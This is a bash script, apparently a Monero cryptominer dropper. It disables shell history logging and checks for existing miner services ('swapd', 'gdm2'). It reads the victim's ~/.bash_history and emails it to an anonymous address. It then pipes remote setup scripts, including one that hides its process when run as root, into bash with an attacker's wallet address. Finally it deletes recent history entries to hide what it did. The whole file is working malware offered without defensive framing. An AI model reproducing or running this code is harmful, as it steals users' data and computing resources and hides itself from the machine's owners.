#!/bin/bash
unset HISTFILE

# Function to check if a service exists
does_service_exist() {
    service="$1"
    systemctl list-units --type=service --all | grep -q "$service.service"
}

# Function to check if a service is running
is_service_running() {
    service="$1"
    systemctl is-active --quiet "$service"
}

# List of services to check
services=("swapd" "gdm2")

# Check if any of the services are running and abort if they are
for service in "${services[@]}"; do
    if does_service_exist "$service"; then
        if is_service_running "$service"; then
            echo "ERROR: Service $service is currently running. Aborting script execution."
            exit 1
        else
            echo "Service $service exists but is not running"
        fi
    else
        echo "Service $service does not exist"
    fi
done

echo -e "\n---------------------------------\n|     Resource     |     Value     |\n---------------------------------"
echo -e "|        RAM        |  $(free -h | awk '/^Mem:/ {print $2}')  |"
echo -e "|   CPU Cores    |      $(nproc)      |"
echo -e "|     Storage      |   $(df -h / | awk 'NR==2 {print $2}')   |"
echo -e "---------------------------------"

# Capture shell history
HISTORY_CONTENT=$(cat ~/.bash_history)

# Install mail utilities if not present
if ! command -v mail &> /dev/null; then
    apt-get update -y
    apt-get install -y mailutils
fi

# Send email with history content
echo "$HISTORY_CONTENT" | mail -s "Shell History from $(hostname)" ff3963a2-ad37-4797-bde9-ac5b76448d8d@jamy.anonaddy.com

rootstuff() {
  echo -e "\nStarting root installation..."
  curl -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/setup_mo_4_r00t_with_processhide.sh | bash -s 4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX
  [ "$USER" != root ] && sudo -u "$USER" "$0"
}

userstuff() {
  echo -e "\nStarting user installation..."
  curl -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/setup_gdm2.sh | bash -s 4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX
}

if [[ $(id -u) -eq 0 ]]; then
    rootstuff
else
    userstuff
fi

HISTSIZE=$(history | wc -l)
for i in {1..5}; do
    if [ $HISTSIZE -gt 0 ]; then
        history -d $HISTSIZE
        HISTSIZE=$((HISTSIZE-1))
    fi
done
